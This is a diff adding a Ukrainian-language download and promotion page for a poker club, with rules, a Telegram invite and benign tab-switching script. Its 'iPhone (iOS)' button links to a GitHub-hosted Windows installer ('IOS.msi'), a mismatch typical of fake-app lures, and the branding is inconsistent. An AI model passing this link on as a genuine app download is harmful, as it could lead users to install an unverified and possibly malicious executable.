@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRK POKER | Premium Download</title>
+    <style>
+        :root {
+            --bg-dark: #050505;
+            --gold-primary: #d4af37;
+            --gold-bright: #f9e498;
+            --gold-dark: #b8860b;
+            --gold-gradient: linear-gradient(135deg, #d4af37 0%, #f9e498 50%, #b8860b 100%);
+            --silver-gradient: linear-gradient(135deg, #bdc3c7 0%, #ffffff 50%, #7f8c8d 100%);
+            --gold-shimmer: linear-gradient(90deg, #b8860b, #f9e498, #d4af37, #f9e498, #b8860b);
+            --sidebar-width: 280px;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at center, rgba(20, 20, 25, 0.7) 0%, rgba(5, 5, 5, 1) 100%),
+                url('https://www.transparenttextures.com/patterns/circuit-board.png');
+            color: white;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: row;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* --- SIDEBAR STYLE (RIGHT) --- */
+        .sidebar {
+            width: var(--sidebar-width);
+            background: rgba(10, 10, 10, 0.85);
+            backdrop-filter: blur(20px);
+            border-left: 1px solid rgba(212, 175, 55, 0.2);
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            z-index: 100;
+            height: 100vh;
+            position: fixed;
+            right: 0;
+            top: 0;
+            box-sizing: border-box;
+        }
+
+        .sidebar-title {
+            color: var(--gold-primary);
+            font-size: 11px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            opacity: 0.6;
+            text-align: center;
+        }
+
+        .nav-button {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(212, 175, 55, 0.1);
+            color: white;
+            padding: 14px 18px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-align: left;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            font-size: 15px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+        }
+
+        .nav-button:hover {
+            background: rgba(212, 175, 55, 0.1);
+            border-color: var(--gold-primary);
+            transform: translateX(-5px);
+        }
+
+        .nav-button.active {
+            background: var(--gold-gradient);
+            color: black;
+            border: none;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
+        }
+
+        /* --- MAIN CONTENT AREA --- */
+        .main-wrapper {
+            margin-right: var(--sidebar-width);
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .wires-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.15;
+        }
+
+        .wire {
+            fill: none;
+            stroke: var(--gold-primary);
+            stroke-width: 1.2;
+            stroke-dasharray: 1000;
+            animation: flowWire 12s linear infinite;
+        }
+
+        @keyframes flowWire {
+            0% { stroke-dashoffset: 2000; }
+            100% { stroke-dashoffset: 0; }
+        }
+
+        .content-section {
+            display: none;
+            position: relative;
+            text-align: center;
+            padding: 40px 30px;
+            max-width: 550px;
+            width: 100%;
+            z-index: 2;
+            background: rgba(10, 10, 10, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(212, 175, 55, 0.15);
+            border-radius: 35px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+        }
+
+        .content-section.active {
+            display: block;
+            animation: fadeIn 0.6s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95) translateY(10px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .info-text {
+            text-align: left;
+            line-height: 1.7;
+            font-size: 14px;
+            color: #e0e0e0;
+            white-space: pre-line;
+            margin-top: 20px;
+        }
+
+        .info-text strong { color: var(--gold-bright); }
+
+        .logo-main {
+            font-size: clamp(50px, 10vw, 72px);
+            font-weight: 900;
+            line-height: 0.8;
+            background: var(--gold-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 15px rgba(212, 175, 55, 0.4));
+        }
+
+        .logo-sub { font-size: clamp(30px, 6vw, 42px); font-weight: 700; letter-spacing: 4px; background: var(--silver-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .separator { width: 60px; height: 2px; background: var(--gold-gradient); margin: 20px auto; }
+        .tagline { color: #888; font-size: 11px; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 30px; }
+
+        .download-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 20px; }
+        .btn-download { background: rgba(30, 30, 30, 0.6); border: 1px solid rgba(212, 175, 55, 0.2); border-radius: 16px; padding: 12px 20px; display: flex; align-items: center; text-decoration: none; color: white; transition: 0.3s; }
+        .btn-download:hover { border-color: var(--gold-primary); background: rgba(50, 50, 50, 0.8); }
+        
+        .btn-club { 
+            background: var(--gold-shimmer); 
+            background-size: 400% 400%; 
+            border: none; 
+            justify-content: center; 
+            animation: goldFlow 8s linear infinite; 
+            margin-bottom: 10px;
+            position: relative;
+            transition: all 0.4s ease; /* Плавный переход для всех эффектов */
+        }
+        /* СПЕЦІАЛЬНИЙ СТИЛЬ ДЛЯ КНОПКИ КЛУБУ (ЗОЛОТИЙ ПЕРЕЛИВ) */
+        .btn-club {
+            background: var(--gold-shimmer);
+            background-size: 400% 400%;
+            border: none;
+            margin-bottom: 10px;
+            justify-content: center;
+            animation: goldFlow 6s ease infinite;
+        }
+
+        .btn-club .btn-text strong {
+            color: #000 !important;
+            font-weight: 800;
+            font-size: 18px;
+        }
+
+        /* Ховер для кнопки клубу - щоб не ставала чорною */
+        .btn-club:hover {
+            background: var(--gold-shimmer) !important;
+            background-size: 200% 200% !important;
+            animation: goldFlow 1.5s linear infinite !important;
+            filter: brightness(1.2);
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 0 25px rgba(212, 175, 55, 0.5);
+        }
+
+        @keyframes goldFlow { 0% { background-position: 0% 50%; } 100% { background-position: 400% 50%; } }
+        
+        .btn-icon { width: 24px; margin-right: 15px; display: flex; justify-content: center; }
+        .btn-icon img { width: 100%; opacity: 0.9; }
+        .btn-text { text-align: left; }
+        .btn-text span { display: block; font-size: 10px; color: #aaa; }
+        .btn-text strong { display: block; font-size: 15px; }
+
+        /* --- MOBILE --- */
+        @media (max-width: 850px) {
+            body { flex-direction: column; }
+            .sidebar { 
+                width: 100%; height: auto; position: fixed; bottom: 0; top: auto; right: 0; left: 0;
+                flex-direction: row; overflow-x: auto; padding: 10px; border-left: none; border-top: 1px solid rgba(212, 175, 55, 0.3);
+                justify-content: space-around; background: rgba(5, 5, 5, 0.95);
+            }
+            .sidebar-title { display: none; }
+            .nav-button { padding: 10px 15px; font-size: 13px; white-space: nowrap; flex: 1; text-align: center; border-radius: 10px; }
+            .main-wrapper { margin-right: 0; padding: 20px 15px 100px 15px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <svg class="wires-overlay" viewBox="0 0 1000 1000" preserveAspectRatio="none">
+            <path class="wire" d="M0,200 L200,200 L250,250 L250,450 L300,500" />
+            <path class="wire" d="M1000,800 L800,800 L750,750 L750,550 L700,500" />
+        </svg>
+
+        <div id="download" class="content-section active">
+            <div class="logo-area">
+                <div class="logo-main">PRK</div>
+                <div class="logo-sub">POKER</div>
+                <div class="separator"></div>
+                <div class="tagline">Мережа покерних клубів</div>
+            </div>
+            <div class="download-grid">
+                <a href="https://clubgg.app.link/ef7mYQSE01b" class="btn-download btn-club">
+                    <div class="btn-text"><strong>ПЕРЕЙТИ ДО КЛУБУ</strong></div>
+                </a>
+                <a href="#" class="btn-download">
+                    <div class="btn-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg"></div>
+                    <div class="btn-text"><span>Завантажити на</span><strong>Windows PC</strong></div>
+                </a>
+                <a href="https://github.com/PokerRPK/PokerPRK/releases/download/v1.0/IOS.msi" class="btn-download">
+                    <div class="btn-icon">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter: invert(1);" alt="Apple">
+                    </div>
+                    <div class="btn-text">
+                        <span>Завантажити для</span>
+                        <strong>iPhone (iOS)</strong>
+                    </div>
+                </a>
+                <a href="#" class="btn-download">
+                    <div class="btn-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter: invert(1);"></div>
+                    <div class="btn-text"><span>Завантажити на</span><strong>macOS Silicon</strong></div>
+                </a>
+                <a href="#" class="btn-download">
+                    <div class="btn-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg"></div>
+                    <div class="btn-text"><span>Доступно для</span><strong>Android APK</strong></div>
+                </a>
+            </div>
+        </div>
+
+        <div id="rules" class="content-section">
+            <h2 style="color:var(--gold-primary)">📜 ПРАВИЛА КЛУБУ</h2>
+            <div class="info-text">
+                <strong>👑 ПРАВИЛА КЛУБУ @PokerPRK</strong>
+                👑 PokerPRK 👑 April 23, 2026
+                <strong>1. ПРО КЛУБ</strong>
+                PokerPRK — закритий клуб, де пріоритетами є безпека та чесна гра.
+
+                <strong>2. ЕТИКА</strong>
+                • Тільки ввічливе спілкування.
+
+                <strong>3. БЕЗПЕКА</strong>
+                Служба безпеки контролює процес. За порушення — блокування.
+
+                <strong>4. ЗАБОРОНЕНО:</strong>
+                • Командна гра, боти, VPN, RTA-підказники.
+                • Гра громадян РФ та РБ суворо заборонена.
+
+                <strong>Адмін: @PokerPRK</strong>
+            </div>
+        </div>
+
+        <div id="clubs" class="content-section">
+            <h2 style="color:var(--gold-primary)">♠️ НАШІ КЛУБИ</h2>
+            <div class="info-text">
+                Ми український покер клуб — <strong>PokerVIP</strong>
+                🆔 ID ClubGG: <strong>482261</strong>
+
+                <a href="https://t.me/+vY9Jo7EzrTk5ZmVi" style="color:var(--gold-bright); text-decoration: none;">➡️ Приєднатися до Telegram</a>
+                Тільки реальні гравці. Щоденні фріроли з грошовими призами!
+                🚀 Пиши адміну <strong>"ХОЧУ БОНУС"</strong>
+                Адмін: <strong>@PokerPRK</strong>
+            </div>
+        </div>
+    </div>
+
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+        <div class="sidebar-title">Навігація</div>
+        <a href="#download" class="nav-button active">📥 Завантажити</a>
+        <a href="#rules" class="nav-button">📜 Правила</a>
+        <a href="#clubs" class="nav-button">♠️ Наші клуби</a>
+    </div>
+
+    <script>
+        function switchTab(hash) {
+            const id = hash.replace('#', '') || 'download';
+            
+            // Скрыть все секции
+            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
+            // Деактивировать кнопки
+            document.querySelectorAll('.nav-button').forEach(b => b.classList.remove('active'));
+
+            const targetSection = document.getElementById(id);
+            if (targetSection) {
+                targetSection.classList.add('active');
+                const targetBtn = document.querySelector(`.nav-button[href="#${id}"]`);
+                if (targetBtn) targetBtn.classList.add('active');
+            }
+
+            if (window.innerWidth < 850) {
+                window.scrollTo({top: 0, behavior: 'smooth'});
+            }
+        }
+
+        // Следим за кликами
+        document.querySelectorAll('.nav-button').forEach(button => {
+            button.addEventListener('click', function() {
+                setTimeout(() => switchTab(window.location.hash), 10);
+            });
+        });
+
+        // Проверка при загрузке (для прямых ссылок)
+        window.addEventListener('load', () => {
+            if (window.location.hash) switchTab(window.location.hash);
+        });
+
+        // Реагируем на кнопку "Назад" в браузере
+        window.addEventListener('hashchange', () => switchTab(window.location.hash));
+    </script>
+</body>
+</html>
